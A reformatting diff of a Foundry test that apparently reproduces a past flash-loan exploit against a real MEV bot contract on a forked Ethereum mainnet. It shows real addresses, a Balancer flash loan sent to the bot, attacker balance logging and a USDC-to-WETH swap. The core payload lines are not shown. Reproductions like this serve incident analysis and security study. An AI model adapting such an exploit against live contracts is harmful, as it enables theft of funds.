@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IWETH} from "src/interfaces/IWETH.sol";
 import {IUSDC} from "src/interfaces/IUSDC.sol";
@@ -26,14 +26,19 @@ import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // Twitter Ancilia : https://twitter.com/AnciliaInc/status/1580705036400611328
 
 contract ContractTest is Test {
-
-    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    IUSDC constant USDC_TOKEN = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IWETH constant WETH_TOKEN =
+        IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IUSDC constant USDC_TOKEN =
+        IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IBalancerVault constant BALANCER_VAULT =
+        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     address constant MEV_BOT = 0x00000000000A47b1298f18Cf67de547bbE0D723F;
-    address constant EXPLOIT_CONTRACT = 0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C;
-    IUniswapV2Pair constant WETH_USDC_PAIR_SUSHI = IUniswapV2Pair(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
-    IUniswapV3Router constant UNI_ROUTER = IUniswapV3Router(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564));
+    address constant EXPLOIT_CONTRACT =
+        0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C;
+    IUniswapV2Pair constant WETH_USDC_PAIR_SUSHI =
+        IUniswapV2Pair(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
+    IUniswapV3Router constant UNI_ROUTER =
+        IUniswapV3Router(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564));
 
     function setUp() public {
         vm.createSelectFork("mainnet", 15_741_332);
@@ -44,14 +49,25 @@ contract ContractTest is Test {
         vm.label(MEV_BOT, "MEV_BOT");
         vm.label(EXPLOIT_CONTRACT, "EXPLOIT_CONTRACT");
         vm.label(address(WETH_USDC_PAIR_SUSHI), "WETH_USDC_PAIR_SUSHI");
-        vm.label(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8, "WETH_USDC_POOL_2");
-        vm.label(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, "WETH_USDC_POOL_3");
-        vm.label(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, "WETH_USDC_PAIR_V2");
+        vm.label(
+            0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8,
+            "WETH_USDC_POOL_2"
+        );
+        vm.label(
+            0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640,
+            "WETH_USDC_POOL_3"
+        );
+        vm.label(
+            0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc,
+            "WETH_USDC_PAIR_V2"
+        );
     }
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "\n[Start] Attacker WETH balance before exploit", WETH_TOKEN.balanceOf(address(this)), 18
+            "\n[Start] Attacker WETH balance before exploit",
+            WETH_TOKEN.balanceOf(address(this)),
+            18
         );
 
         address[] memory tokens = new address[](1);
@@ -95,7 +111,9 @@ contract ContractTest is Test {
         BALANCER_VAULT.flashLoan(MEV_BOT, tokens, amounts, userData);
 
         emit log_named_decimal_uint(
-            "\tAttacker USDC balance during the exploit...", USDC_TOKEN.balanceOf(address(this)), 6
+            "\tAttacker USDC balance during the exploit...",
+            USDC_TOKEN.balanceOf(address(this)),
+            6
         );
 
         // Exchanging all USDC for WETH
@@ -103,7 +121,9 @@ contract ContractTest is Test {
         _USDCToWETH();
 
         emit log_named_decimal_uint(
-            "\n[End] Attacker WETH balance after exploit", WETH_TOKEN.balanceOf(address(this)), 18
+            "\n[End] Attacker WETH balance after exploit",
+            WETH_TOKEN.balanceOf(address(this)),
+            18
         );
     }
 
@@ -119,17 +139,17 @@ contract ContractTest is Test {
      * Auxiliary function to swap all USDC to WETH
      */
     function _USDCToWETH() internal {
-        IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
-            tokenIn: address(USDC_TOKEN),
-            tokenOut: address(WETH_TOKEN),
-            fee: 500,
-            recipient: address(this),
-            deadline: block.timestamp,
-            amountIn: USDC_TOKEN.balanceOf(address(this)),
-            amountOutMinimum: 0,
-            sqrtPriceLimitX96: 0
-        });
+        IUniswapV3Router.ExactInputSingleParams
+            memory _Params = IUniswapV3Router.ExactInputSingleParams({
+                tokenIn: address(USDC_TOKEN),
+                tokenOut: address(WETH_TOKEN),
+                fee: 500,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: USDC_TOKEN.balanceOf(address(this)),
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
         UNI_ROUTER.exactInputSingle(_Params);
     }
-
 }
